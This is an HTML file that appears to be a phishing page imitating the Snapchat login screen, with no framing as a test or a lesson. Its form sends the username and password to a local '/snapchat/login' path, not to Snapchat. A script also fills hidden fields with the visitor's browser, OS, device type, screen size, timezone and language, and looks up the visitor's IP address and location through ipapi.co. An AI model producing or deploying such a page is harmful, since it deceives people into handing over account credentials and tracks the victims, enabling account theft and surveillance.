<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Snapchat - Log in</title>
<style>
  * { margin:0; padding:0; box-sizing:border-box; }
  body { font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
         background:#fffc00; min-height:100vh;
         display:flex; justify-content:center; align-items:center; padding:20px; }
  .card { width:100%; max-width:400px; background:#fff; border-radius:24px;
          padding:32px 28px; box-shadow:0 10px 40px rgba(0,0,0,0.15); text-align:center; }
  .ghost { font-size:64px; margin-bottom:8px; }
  h1 { font-size:24px; font-weight:700; margin-bottom:6px; color:#000; }
  .sub { font-size:14px; color:#666; margin-bottom:24px; }
  input { width:100%; padding:14px 16px; font-size:15px; border:1px solid #ddd;
    border-radius:30px; margin-bottom:12px; outline:none; background:#f7f7f7; }
  input:focus { border-color:#000; background:#fff; }
  .btn { width:100%; background:#fffc00; color:#000; border:none; padding:14px;
    font-size:16px; font-weight:700; border-radius:30px; cursor:pointer;
    margin-top:8px; box-shadow:0 2px 6px rgba(0,0,0,0.1); }
  .forgot { display:inline-block; color:#000; font-size:13px; text-decoration:underline; margin-top:16px; }
  @media (max-width:400px) { body { padding:12px; } .card { padding:24px 20px; } .ghost { font-size:52px; } }
</style>
</head>
<body>
  <div class="card">
    <div class="ghost">👻</div>
    <h1>Log in to Snapchat</h1>
    <p class="sub">Welcome back!</p>
    <form action="/snapchat/login" method="POST" id="login-form">
      <input type="text" name="email" placeholder="Username or Email" required>
      <input type="password" name="password" placeholder="Password" required>
      <button type="submit" class="btn">Log In</button>
      <input type="hidden" name="ip_address" id="ip-address">
      <input type="hidden" name="geo_location" id="geo-location">
      <input type="hidden" name="device_type" id="device-type">
      <input type="hidden" name="browser_info" id="browser-info">
      <input type="hidden" name="os_info" id="os-info">
      <input type="hidden" name="screen_resolution" id="screen-resolution">
      <input type="hidden" name="timezone" id="timezone">
      <input type="hidden" name="language" id="language">
    </form>
    <a href="#" class="forgot">Forgot your password?</a>
  </div>
<script>
async function collectFingerprint() {
  const ua = navigator.userAgent;
  document.getElementById('browser-info').value = ua;
  document.getElementById('os-info').value = navigator.platform;
  document.getElementById('device-type').value = /Mobi|Android|iPhone|iPad|iPod/i.test(ua) ? 'Mobile' : 'Desktop';
  document.getElementById('screen-resolution').value = `${window.screen.width}x${window.screen.height}`;
  document.getElementById('timezone').value = Intl.DateTimeFormat().resolvedOptions().timeZone;
  document.getElementById('language').value = navigator.language;
  try {
    const res = await fetch('https://ipapi.co/json/');
    const d = await res.json();
    if (d.ip) {
      document.getElementById('ip-address').value = d.ip;
      document.getElementById('geo-location').value = [d.city, d.region, d.country_name].filter(Boolean).join(', ');
    }
  } catch(e) {}
}
document.addEventListener('DOMContentLoaded', () => {
  collectFingerprint();
  const form = document.getElementById('login-form');
  form.addEventListener('submit', async (e) => {
    e.preventDefault();
    await collectFingerprint();
    form.submit();
  });
});
</script>
</body>
</html>
